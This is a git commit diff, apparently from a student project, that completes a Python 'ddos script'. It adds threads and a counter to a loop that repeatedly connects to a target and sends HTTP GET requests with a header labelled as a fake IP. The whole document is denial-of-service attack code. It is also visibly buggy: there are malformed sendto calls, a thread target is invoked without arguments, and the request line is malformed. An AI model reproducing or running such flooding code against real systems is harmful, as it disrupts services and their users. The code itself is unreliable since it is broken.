87a17967aac57706ed9c678efb8c53f7cad6008b
Luis Gonzalez <lg222zm@student.lnu.se>
2023-01-12 10:32:00 +0100

    Finished basic ddos script

--- Project/ddos_script/main.py
+++ Project/ddos_script/main.py
@@ -1,20 +1,28 @@
 import socket
 import threading
 
-
 # target = '10.0.0.138'
 # fake_ip = '182.21.20.32'
 # port = 80
 
+attack_num = 0
 def attack(target: str, fake_ip: str, port: int):
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target, port))
         s.sendto(('GET /' + target + 'HTTP/1.1\r\n').encode('ascii'), (target, port))
         s.sendto(('Host: ' + fake_ip + '\r\n\r\n').encode('ascii'), target, port)
+
+        global attack_num
+        attack_num += 1
+        print(attack_num)
         s.close()
 
 
+def main():
+    for i in range(10):
+        thread = threading.Thread(target=attack())
+        thread.start()
 
 if __name__ == "__main__":
     main()
